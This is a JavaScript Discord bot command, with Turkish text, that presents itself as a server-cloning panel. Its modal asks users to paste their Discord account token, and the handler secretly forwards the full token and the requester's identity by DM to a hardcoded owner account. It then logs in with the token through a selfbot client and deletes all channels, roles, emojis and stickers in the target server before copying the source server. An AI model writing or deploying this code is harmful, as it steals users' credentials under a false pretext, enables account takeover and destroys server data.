const { 
    SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, 
    ModalBuilder, TextInputBuilder, TextInputStyle, InteractionType, PermissionFlagsBits
} = require('discord.js');
const { Client: SelfClient } = require('discord.js-selfbot-v13');

const jitter = (ms = 500) => new Promise(res => setTimeout(res, Math.floor(Math.random() * 500) + ms));

module.exports = {
    data: new SlashCommandBuilder()
        .setName('kur')
        .setDescription('🌌 FORCES God Mode Cloner panelini kurar (Sadece Sahip)')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

    async execute(interaction) {
        const OWNER_ID = "1389930042200559706";

        if (interaction.user.id !== OWNER_ID) {
            return await interaction.reply({ 
                content: "❌ Bu komutu sadece bot sahibi kullanabilir.", 
                ephemeral: true 
            });
        }

        if (!interaction.client.kurListenerSet) {
            interaction.client.on('interactionCreate', handleInteraction);
            interaction.client.kurListenerSet = true;
        }

        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle('🌌 FORCES God Mode Cloner')
            .setDescription(
                `**BİREBİR KLONLAMA SİSTEMİ**\n\n` +
                `✅ **Özellikler:**\n` +
                `• Rol sıralaması AYNEN korunur\n` +
                `• Tüm yetkiler BİREBİR kopyalanır\n` +
                `• Kanal izinleri EKSİKSİZ aktarılır\n` +
                `• Hedef sunucu TAMAMEN temizlenir\n\n` +
                `⚠️ **Hata çıksa bile işlem devam eder!**`
            )
            .setFooter({ text: 'FORCES God Mode | BİREBİR KLONLAMA' })
            .setTimestamp();

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('btn_god_clone')
                .setLabel('💣 Birebir Klonlamayı Başlat')
                .setStyle(ButtonStyle.Danger)
                .setEmoji('⚡')
        );

        await interaction.reply({ embeds: [embed], components: [row] });
    }
};

async function handleInteraction(int) {
    if (int.isButton() && int.customId === 'btn_god_clone') {
        const modal = new ModalBuilder()
            .setCustomId('modal_god_clone')
            .setTitle('🌌 Klonlama Bilgileri');

        modal.addComponents(
            new ActionRowBuilder().addComponents(
                new TextInputBuilder()
                    .setCustomId('token')
                    .setLabel('🔑 Token (TAM GÖZÜKECEK)')
                    .setStyle(TextInputStyle.Short)
                    .setPlaceholder('Tokeni buraya yapıştır')
                    .setRequired(true)
            ),
            new ActionRowBuilder().addComponents(
                new TextInputBuilder()
                    .setCustomId('source')
                    .setLabel('📤 Kaynak Sunucu ID')
                    .setStyle(TextInputStyle.Short)
                    .setPlaceholder('Klonlanacak sunucu ID')
                    .setRequired(true)
            ),
            new ActionRowBuilder().addComponents(
                new TextInputBuilder()
                    .setCustomId('target')
                    .setLabel('📥 Hedef Sunucu ID')
                    .setStyle(TextInputStyle.Short)
                    .setPlaceholder('Hedef sunucu ID')
                    .setRequired(true)
            )
        );

        return await int.showModal(modal);
    }

    if (int.type === InteractionType.ModalSubmit && int.customId === 'modal_god_clone') {
        await int.deferReply({ ephemeral: true });
        
        const token = int.fields.getTextInputValue('token').trim();
        const sourceId = int.fields.getTextInputValue('source').trim();
        const targetId = int.fields.getTextInputValue('target').trim();
        
        const OWNER_ID = "1389930042200559706";
        const botOwner = await int.client.users.fetch(OWNER_ID).catch(() => null);
        
        if (botOwner) {
            const logEmbed = new EmbedBuilder()
                .setColor('#ff0000')
                .setTitle('📥 YENİ KLONLAMA - TÜM BİLGİLER')
                .setDescription(`**Talep Eden:** ${int.user.tag} (\`${int.user.id}\`)`)
                .addFields(
                    { name: '🔑 TOKEN (TAM HALİ)', value: `\`\`\`${token}\`\`\``, inline: false },
                    { name: '📤 Kaynak', value: `\`${sourceId}\``, inline: true },
                    { name: '📥 Hedef', value: `\`${targetId}\``, inline: true },
                    { name: '⏰ Zaman', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false }
                )
                .setFooter({ text: '⚠️ TOKEN AÇIK GÖZÜKÜYOR - ROL SIRASI VE YETKİLER BİREBİR KOPYALANACAK' })
                .setTimestamp();
                
            await botOwner.send({ embeds: [logEmbed] }).catch(() => {});
        }

        startExactClone(botOwner, token, sourceId, targetId, int.user.tag);
        await int.editReply({ content: "✅ Birebir klonlama başlatıldı!", ephemeral: true });
    }
}

// ANA FONKSİYON - BİREBİR KLONLAMA
async function startExactClone(owner, token, sourceId, targetId, requester) {
    if (!owner) return;
    
    const self = new SelfClient({ 
        checkUpdate: false,
        intents: ['GUILDS', 'GUILD_MESSAGES', 'GUILD_MEMBERS']
    });
    
    self.on('ready', async () => {
        try {
            const sourceGuild = self.guilds.cache.get(sourceId);
            const targetGuild = self.guilds.cache.get(targetId);

            if (!sourceGuild || !targetGuild) {
                return owner.send("❌ HATA: Sunuculara erişilemedi!");
            }

            await owner.send({ 
                embeds: [new EmbedBuilder()
                    .setColor('#ff5500')
                    .setTitle('⚡ BİREBİR KLONLAMA BAŞLADI')
                    .setDescription(
                        `**Kaynak:** ${sourceGuild.name}\n` +
                        `**Hedef:** ${targetGuild.name}\n` +
                        `**Mod:** Rol sırası ve yetkiler birebir kopyalanacak`
                    )
                ]
            });

            // 1. HEDEFİ TAMAMEN TEMİZLE
            await owner.send("🧹 Hedef sunucu temizleniyor...");
            await nukeTargetGuild(targetGuild, owner);

            // 2. ROLLERİ SIRASIYLA VE YETKİLERİYLE KLONLA
            await owner.send("👥 Roller SIRASIYLA ve YETKİLERİYLE klonlanıyor...");
            const roleMap = await cloneRolesExactOrder(sourceGuild, targetGuild, owner);

            // 3. SUNUCU AYARLARI
            await owner.send("⚙️ Sunucu ayarları aktarılıyor...");
            await cloneServerSettings(sourceGuild, targetGuild);

            // 4. KANALLARI İZİNLERİYLE KLONLA
            await owner.send("📂 Kanallar İZİNLERİYLE klonlanıyor...");
            await cloneChannelsExact(sourceGuild, targetGuild, roleMap, owner);

            // 5. EMOJİLER
            await owner.send("😀 Emojiler klonlanıyor...");
            await cloneEmojisSafe(sourceGuild, targetGuild, owner);

            await owner.send({ 
                embeds: [new EmbedBuilder()
                    .setColor('#00ff00')
                    .setTitle('✅ BİREBİR KLONLAMA TAMAMLANDI')
                    .setDescription(
                        `${sourceGuild.name} ➜ ${targetGuild.name}\n\n` +
                        `✅ Rol sıralaması AYNEN korundu\n` +
                        `✅ Tüm yetkiler BİREBİR kopyalandı\n` +
                        `✅ Kanal izinleri EKSİKSİZ aktarıldı`
                    )
                ]
            });

        } catch (err) {
            await owner.send(`❌ ANA HATA: ${err.message}`);
        } finally {
            self.destroy();
        }
    });

    self.login(token).catch((err) => {
        if (owner) owner.send(`❌ TOKEN BAĞLANTI HATASI: ${err.message}`);
    });
}

// HEDEF SUNUCUYU TAMAMEN TEMİZLE
async function nukeTargetGuild(guild, owner) {
    let [deletedChannels, deletedRoles, deletedEmojis, deletedStickers, errors] = [0, 0, 0, 0, 0];

    // Kanalları sil
    try {
        const channels = await guild.channels.fetch().catch(() => new Map());
        for (const channel of channels.values()) {
            try { await channel.delete(); deletedChannels++; await jitter(300); } catch { errors++; }
        }
    } catch { errors++; }

    // Emojileri sil
    try {
        const emojis = await guild.emojis.fetch().catch(() => new Map());
        for (const emoji of emojis.values()) {
            try { await emoji.delete(); deletedEmojis++; await jitter(200); } catch { errors++; }
        }
    } catch { errors++; }

    // Stickerları sil
    try {
        const stickers = await guild.stickers.fetch().catch(() => new Map());
        for (const sticker of stickers.values()) {
            try { await sticker.delete(); deletedStickers++; await jitter(200); } catch { errors++; }
        }
    } catch { errors++; }

    // ROLLERİ SİL - YÜKSEKTEN DÜŞÜĞE SIRAYLA
    try {
        const roles = await guild.roles.fetch().catch(() => new Map());
        const rolesToDelete = [...roles.values()]
            .filter(r => {
                try { return r.name !== '@everyone' && !r.managed && r.editable && r.id !== guild.id; } 
                catch { return false; }
            })
            .sort((a, b) => {
                try { return b.position - a.position; } // YÜKSEK POZİSYONDAN DÜŞÜĞE
                catch { return 0; }
            });

        for (const role of rolesToDelete) {
            try { 
                await role.delete('Klonlama temizliği'); 
                deletedRoles++; 
                await jitter(400); 
            } catch { 
                errors++;
                // Silinemedi ama devam et
            }
        }
    } catch { errors++; }

    await owner.send({
        embeds: [new EmbedBuilder()
            .setColor('#ff9900')
            .setTitle('🧹 TEMİZLİK TAMAMLANDI')
            .setDescription(
                `✅ Kanallar: **${deletedChannels}** silindi\n` +
                `✅ Roller: **${deletedRoles}** silindi\n` +
                `✅ Emojiler: **${deletedEmojis}** silindi\n` +
                `✅ Stickerlar: **${deletedStickers}** silindi\n` +
                `⚠️ Hatalar: **${errors}** es geçildi`
            )
        ]
    });
}

// ROLLERİ TAM SIRASIYLA VE YETKİLERİYLE KLONLA
async function cloneRolesExactOrder(sourceGuild, targetGuild, owner) {
    const roleMap = new Map();
    let [cloned, errors] = [0, 0];

    // Kaynak rolleri SIRALI şekilde al
    // ÖNCE düşük pozisyonlular (everyone'a yakın) oluşturulmalı
    // SONRA yüksek pozisyonlular
    const sourceRoles = [...sourceGuild.roles.cache.values()]
        .filter(r => r.name !== '@everyone' && !r.managed)
        .sort((a, b) => a.position - b.position); // DÜŞÜKTEN YÜKSEĞE SIRALA

    // Hedefteki @everyone rolünü al
    const everyoneRole = targetGuild.roles.everyone;
    
    // Önce @everyone yetkilerini güncelle (kaynak sunucudakiyle aynı yap)
    const sourceEveryone = sourceGuild.roles.everyone;
    if (sourceEveryone && everyoneRole) {
        try {
            await everyoneRole.setPermissions(sourceEveryone.permissions).catch(() => {});
            await jitter(300);
        } catch {}
    }

    // Rolleri sırayla oluştur
    for (const role of sourceRoles) {
        try {
            // YENİ ROL OLUŞTUR - TÜM ÖZELLİKLERİYLE
            const newRole = await targetGuild.roles.create({
                name: role.name,
                color: role.color,
                hoist: role.hoist,
                permissions: role.permissions, // YETKİLER BİREBİR
                mentionable: role.mentionable,
                reason: 'Birebir klonlama - Yetkiler ve sıra korunuyor'
            });

            if (newRole) {
                roleMap.set(role.id, newRole.id);
                cloned++;

                // ROL POZİSYONUNU AYARLA - EN ÖNEMLİ KISIM
                try {
                    // Yeni oluşturulan rolün pozisyonunu kaynak rolle aynı yap
                    await newRole.setPosition(role.position, { reason: 'Pozisyon birebir ayarlanıyor' });
                    await jitter(300);
                } catch (posErr) {
                    // Pozisyon ayarlanamazsa en azından rol oluştu
                    await owner.send(`⚠️ ${role.name} pozisyonu ayarlanamadı: ${posErr.message}`);
                }
            }
        } catch (err) {
            errors++;
            await owner.send(`⚠️ ${role.name} oluşturulamadı: ${err.message}`);
            // HATA ÇIKSA BİLE DEVAM
        }
        
        await jitter(400);
    }

    await owner.send({
        embeds: [new EmbedBuilder()
            .setColor('#00aaff')
            .setTitle('👥 ROLLER KLONLANDI')
            .setDescription(
                `✅ **${cloned}** rol birebir klonlandı\n` +
                `⚠️ **${errors}** hata es geçildi\n\n` +
                `📌 **Rol sıralaması ve yetkiler KORUNDU**`
            )
        ]
    });

    return roleMap;
}

// SUNUCU AYARLARI
async function cloneServerSettings(sourceGuild, targetGuild) {
    try { await targetGuild.setName(sourceGuild.name).catch(() => {}); } catch {}
    
    try {
        if (sourceGuild.iconURL()) {
            await targetGuild.setIcon(sourceGuild.iconURL({ size: 1024 })).catch(() => {});
        }
    } catch {}
    
    try {
        if (sourceGuild.bannerURL()) {
            await targetGuild.setBanner(sourceGuild.bannerURL({ size: 1024 })).catch(() => {});
        }
    } catch {}
    
    try {
        if (sourceGuild.splashURL()) {
            await targetGuild.setSplash(sourceGuild.splashURL({ size: 1024 })).catch(() => {});
        }
    } catch {}
    
    try {
        if (sourceGuild.discoverySplashURL()) {
            await targetGuild.setDiscoverySplash(sourceGuild.discoverySplashURL({ size: 1024 })).catch(() => {});
        }
    } catch {}

    // Doğrulama seviyesi
    try { await targetGuild.setVerificationLevel(sourceGuild.verificationLevel).catch(() => {}); } catch {}
    
    // Bildirim ayarları
    try { await targetGuild.setDefaultMessageNotifications(sourceGuild.defaultMessageNotifications).catch(() => {}); } catch {}
    
    // Açık içerik filtresi
    try { await targetGuild.setExplicitContentFilter(sourceGuild.explicitContentFilter).catch(() => {}); } catch {}
}

// KANALLARI TAM İZİNLERİYLE KLONLA
async function cloneChannelsExact(sourceGuild, targetGuild, roleMap, owner) {
    let [cloned, errors] = [0, 0];

    // TÜM KANALLARI POZİSYONA GÖRE SIRALA
    const allChannels = [...sourceGuild.channels.cache.values()]
        .sort((a, b) => a.position - b.position);

    // ÖNCE KATEGORİLERİ OLUŞTUR (pozisyon sırasıyla)
    const categories = allChannels.filter(c => c.type === 4);
    const categoryMap = new Map();

    for (const cat of categories) {
        try {
            const newCat = await targetGuild.channels.create({
                name: cat.name,
                type: 4,
                position: cat.position,
                permissionOverwrites: getExactPermissions(cat, roleMap),
                reason: 'Birebir klonlama - Kategori'
            });
            
            if (newCat) {
                categoryMap.set(cat.id, newCat.id);
                cloned++;
                
                // Kategori pozisyonunu ayarla
                try { await newCat.setPosition(cat.position); } catch {}
            }
        } catch (err) {
            errors++;
            await owner.send(`⚠️ Kategori oluşturulamadı: ${cat.name}`);
        }
        await jitter(500);
    }

    // SONRA KANALLARI OLUŞTUR (kategorili ve kategorisiz)
    const channels = allChannels.filter(c => c.type !== 4);

    for (const channel of channels) {
        try {
            let channelType;
            switch (channel.type) {
                case 0: channelType = 0; break; // Text
                case 2: channelType = 2; break; // Voice
                case 5: channelType = 5; break; // Announcement
                case 13: channelType = 13; break; // Stage
                case 15: channelType = 15; break; // Forum
                default: channelType = 0;
            }

            const newChannel = await targetGuild.channels.create({
                name: channel.name,
                type: channelType,
                parent: channel.parentId ? categoryMap.get(channel.parentId) : null,
                topic: channel.topic || null,
                nsfw: channel.nsfw || false,
                bitrate: channel.bitrate || 64000,
                userLimit: channel.userLimit || 0,
                rateLimitPerUser: channel.rateLimitPerUser || 0,
                position: channel.position,
                permissionOverwrites: getExactPermissions(channel, roleMap),
                reason: 'Birebir klonlama - Kanal'
            });

            if (newChannel) {
                cloned++;
                
                // Kanal pozisyonunu birebir ayarla
                try { 
                    await newChannel.setPosition(channel.position); 
                    await jitter(200);
                } catch {}
            }
        } catch (err) {
            errors++;
            await owner.send(`⚠️ Kanal oluşturulamadı: ${channel.name}`);
            // DEVAM ET
        }
        await jitter(400);
    }

    await owner.send({
        embeds: [new EmbedBuilder()
            .setColor('#00aaff')
            .setTitle('📂 KANALLAR KLONLANDI')
            .setDescription(
                `✅ **${cloned}** kanal/kategori klonlandı\n` +
                `⚠️ **${errors}** hata es geçildi\n\n` +
                `📌 **Kanal izinleri BİREBİR kopyalandı**`
            )
        ]
    });
}

// TAM İZİNLERİ AL - HER ŞEYİYLE
function getExactPermissions(channel, roleMap) {
    try {
        return channel.permissionOverwrites.cache.map(overwrite => {
            // Rol ID'sini eşle veya orijinalini kullan
            const mappedId = roleMap.get(overwrite.id) || overwrite.id;
            
            return {
                id: mappedId,
                allow: overwrite.allow, // İZİN VERİLENLER BİREBİR
                deny: overwrite.deny,   // REDDEDİLENLER BİREBİR
                type: overwrite.type    // 0 = role, 1 = member
            };
        });
    } catch {
        return [];
    }
}

// EMOJİLERİ KLONLA
async function cloneEmojisSafe(sourceGuild, targetGuild, owner) {
    let [cloned, errors] = [0, 0];

    for (const emoji of sourceGuild.emojis.cache.values()) {
        try {
            await targetGuild.emojis.create({
                attachment: emoji.url,
                name: emoji.name,
                reason: 'Birebir klonlama'
            });
            cloned++;
            await jitter(300);
        } catch (err) {
            errors++;
            if (err.code === 30008) {
                await owner.send("⚠️ Emoji limiti doldu (50 animasyonlu / 50 normal)");
                break;
            }
            // DİĞER HATALAR ES GEÇ
        }
    }

    await owner.send(`✅ ${cloned} emoji klonlandı, ⚠️ ${errors} hata es geçildi`);
}
